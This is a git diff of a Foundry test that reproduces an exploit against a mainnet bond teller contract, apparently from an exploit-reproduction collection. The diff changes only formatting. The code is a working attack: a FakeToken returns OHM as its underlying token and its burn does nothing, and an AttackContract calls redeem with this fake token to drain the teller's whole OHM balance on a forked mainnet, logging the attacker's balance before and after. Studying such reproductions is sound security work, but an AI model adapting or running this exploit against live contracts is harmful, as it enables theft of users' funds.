@@ -23,10 +23,13 @@ address constant OHM = 0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5;
 address constant BondFixedExpiryTeller = 0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156;
 
 interface IBondFixedExpiryTeller {
+
     function redeem(address token_, uint256 amount_) external;
+
 }
 
 contract FakeToken {
+
     function underlying() external pure returns (address) {
         return OHM;
     }
@@ -38,9 +41,11 @@ contract FakeToken {
     function burn(address, uint256) external pure {
         // do nothing
     }
+
 }
 
 contract AttackContract is Test {
+
     function setUp() public {
         vm.createSelectFork("mainnet", 15_794_363);
         vm.label(OHM, "OHM");
@@ -49,24 +54,14 @@ contract AttackContract is Test {
 
     function testExploit() public {
         console.log("---------- Start from block %s ----------", block.number);
-        emit log_named_decimal_uint(
-            "Attacker OHM balance",
-            IERC20(OHM).balanceOf(address(this)),
-            9
-        );
+        emit log_named_decimal_uint("Attacker OHM balance", IERC20(OHM).balanceOf(address(this)), 9);
 
         address fakeToken = address(new FakeToken());
 
         uint256 ohmBalance = IERC20(OHM).balanceOf(BondFixedExpiryTeller);
-        IBondFixedExpiryTeller(BondFixedExpiryTeller).redeem(
-            fakeToken,
-            ohmBalance
-        );
+        IBondFixedExpiryTeller(BondFixedExpiryTeller).redeem(fakeToken, ohmBalance);
         console.log("Redeeming...");
-        emit log_named_decimal_uint(
-            "Attacker OHM balance after hack",
-            IERC20(OHM).balanceOf(address(this)),
-            9
-        );
+        emit log_named_decimal_uint("Attacker OHM balance after hack", IERC20(OHM).balanceOf(address(this)), 9);
     }
+
 }
